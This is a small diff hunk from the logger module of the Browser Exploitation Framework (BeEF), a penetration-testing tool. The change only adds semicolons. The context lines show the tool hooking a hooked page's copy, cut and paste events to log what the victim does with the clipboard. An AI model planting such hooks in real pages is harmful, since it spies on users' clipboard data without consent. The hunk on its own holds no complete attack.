@@ -78,10 +78,10 @@ beef.logger = {
 		);
 		document.body.oncopy = function() {
 			setTimeout("beef.logger.copy();", 10);
-		}
+		};
 		document.body.oncut = function() {
 			setTimeout("beef.logger.cut();", 10);
-		}
+		};
 		document.body.onpaste = function() {
 			beef.logger.paste();
 		}
